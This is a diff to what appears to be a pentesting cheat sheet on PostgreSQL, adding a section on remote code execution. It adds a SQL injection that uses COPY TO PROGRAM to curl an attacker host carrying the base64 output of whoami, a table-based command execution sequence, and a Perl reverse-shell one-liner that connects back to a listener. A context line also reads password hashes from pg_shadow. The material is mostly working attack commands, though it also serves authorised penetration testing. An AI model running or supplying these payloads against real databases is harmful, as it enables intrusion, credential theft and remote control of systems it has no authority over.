@@ -509,10 +509,30 @@ postgres=# \q                        // quit
 <DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
 ```
 
-### Command Execution
+### Postgres Remote Code Execution
+
+> https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
 
 ```c
 <DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
+```
+
+or
+
+```c
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
+<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
+<DATABASE>=# SELECT * FROM cmd_exec;
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+```
+
+#### Reverse Shell
+
+Notice that in order to scape a single quote you need to put `2 single` quotes.
+
+```c
+<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
 #### File Write
